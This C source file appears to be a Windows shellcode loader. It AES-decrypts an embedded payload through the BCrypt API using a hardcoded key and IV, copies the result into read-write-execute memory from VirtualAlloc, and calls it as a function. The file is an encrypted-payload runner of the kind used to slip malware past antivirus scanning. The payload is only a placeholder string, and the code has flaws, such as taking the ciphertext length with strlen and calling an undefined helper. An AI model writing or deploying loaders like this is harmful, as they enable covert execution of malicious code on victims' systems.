#include <Windows.h>
#include <stdio.h>
#include <bcrypt.h>


// See encrypt.c for explanation of the common code

#pragma comment(lib, "Bcrypt.lib")

#define NT_SUCCESS(status) (((NTSTATUS)(status)) >= 0)

#define KEYSIZE 32
#define IVSIZE 16

typedef struct _AES {
    PBYTE pPlainText;
    DWORD dwPlainSize;
    PBYTE pCipherText;
    DWORD dwCipherSize;
    PBYTE pKey;
    PBYTE pIv;
} AES, * PAES;

BOOL InstallAesDecryption(PAES pAes) {
    BOOL bSTATE = TRUE;

    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE hKeyHandle = NULL;

    ULONG cbResult = NULL;
    DWORD dwBlockSize = NULL;

    DWORD cbKeyObject = NULL;
    PBYTE pbKeyObject = NULL;

    PBYTE pbPlainText = NULL;
    DWORD cbPlainText = NULL;

    NTSTATUS STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfDecryptionFunc;
    }

    STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfDecryptionFunc;
    }

    STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfDecryptionFunc;
    }

    if (dwBlockSize != 16) {
        bSTATE = FALSE; goto _EndOfDecryptionFunc;
    }

    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (pbKeyObject == NULL) {
        bSTATE = FALSE; goto _EndOfDecryptionFunc;
    }

    STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfDecryptionFunc;
    }

    STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfDecryptionFunc;
    }

    STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptDecrypt[1] Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfDecryptionFunc;
    }

    pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
    if (pbPlainText == NULL) {
        bSTATE = FALSE; goto _EndOfDecryptionFunc;
    }

    STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptDecrypt[2] Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfDecryptionFunc;
    }

    // Clean up
_EndOfDecryptionFunc:
    if (hKeyHandle) {
        BCryptDestroyKey(hKeyHandle);
    }
    if (hAlgorithm) {
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
    }
    if (pbKeyObject) {
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
    }
    if (pbPlainText != NULL && bSTATE) {
        pAes->pPlainText = pbPlainText;
        pAes->dwPlainSize = cbPlainText;
    }
    return bSTATE;
}

int main() {
    // Set your key and IV here
    // Hardcode them in here from your encrypt.c output
    // If we are using the encryption and decryption in the same program, we can simply reference our earlier variable.
    BYTE pKey[KEYSIZE] = {
       0x2F, 0xE1, 0x9D, 0x2A, 0xF5, 0x3C, 0x7E, 0x89, 0x12, 0x3F, 0x88, 0x9B, 0x0A, 0x4D, 0x16, 0x7C,
       0x2F, 0xE1, 0x9D, 0x2A, 0xF5, 0x3C, 0x7E, 0x89, 0x12, 0x3F, 0x88, 0x9B, 0x0A, 0x4D, 0x16, 0x7C
    };

    BYTE pIv[IVSIZE] = {
        0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF, 0xFE, 0xDC, 0xBA, 0x98, 0x76, 0x54, 0x32, 0x10
    };


    // PLACE ENCRYPTED PAYLOAD HERE
    unsigned char CipherText[] = {
        // ... (Your cipher text)
        "payload encrypted in encrypt.c"
    };

    AES AesDecryption = {
        .pKey = pKey,
        .pIv = pIv,
        .pCipherText = CipherText,
        .dwCipherSize = strlen((char*)CipherText)
    };

    // Perform decryption
    if (!InstallAesDecryption(&AesDecryption)) {
        return -1;
    }

    // Print decrypted buffer as hex array
    PrintHexData("DecryptedText", AesDecryption.pPlainText, AesDecryption.dwPlainSize);

    // Allocate executable memory
    void* executableMemory = VirtualAlloc(NULL, AesDecryption.dwPlainSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!executableMemory) {
        printf("Failed to allocate executable memory.\n");
        return -1;
    }

    // Copy the decrypted data to executable memory
    memcpy(executableMemory, AesDecryption.pPlainText, AesDecryption.dwPlainSize);

    // Execute the decrypted shellcode
    void (*shellcode)() = (void (*)())executableMemory;
    shellcode();

    // Free the allocated memory
    VirtualFree(executableMemory, 0, MEM_RELEASE);

    // Freeing
    HeapFree(GetProcessHeap(), 0, AesDecryption.pPlainText);
    system("PAUSE");
    return 0;
}